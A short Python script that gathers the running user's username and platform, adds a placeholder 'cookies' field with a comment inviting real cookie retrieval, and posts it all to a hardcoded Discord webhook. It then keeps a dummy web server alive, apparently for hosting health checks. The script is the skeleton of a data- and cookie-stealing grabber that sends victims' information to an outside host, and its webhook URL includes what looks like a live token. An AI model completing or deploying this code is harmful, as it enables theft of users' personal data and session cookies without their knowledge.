import os
import platform
from http.server import BaseHTTPRequestHandler, HTTPServer
from discord import SyncWebhook

# Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp"

# Function to send a message to Discord webhook
def send_to_discord(message):
    try:
        webhook = SyncWebhook.from_url(WEBHOOK_URL)
        webhook.send(content=message)
        print("Message sent to webhook successfully.")
    except Exception as e:
        print(f"Error sending webhook: {e}")

# Function to collect and send user data
def collect_user_data():
    try:
        user_info = {
            "username": os.getenv("USER", "Unknown User"),
            "platform": platform.system(),
        }
        cookies = "Dummy cookies data"  # Replace with actual cookie retrieval if needed
        user_info["cookies"] = cookies

        # Send the data to Discord
        send_to_discord(f"User Info: {user_info}")
    except Exception as e:
        print(f"Error collecting user data: {e}")

# Dummy HTTP server for Render health checks
class DummyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server is running.")
        else:
            self.send_response(404)
            self.end_headers()

def start_dummy_server():
    try:
        server_address = ("0.0.0.0", 8080)  # Bind to all interfaces
        httpd = HTTPServer(server_address, DummyServer)
        print("Starting dummy server on port 8080...")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Shutting down the server.")
    except Exception as e:
        print(f"Error starting server: {e}")

# Main function
def main():
    print("Starting the process...")
    collect_user_data()
    start_dummy_server()

if __name__ == "__main__":
    main()
    
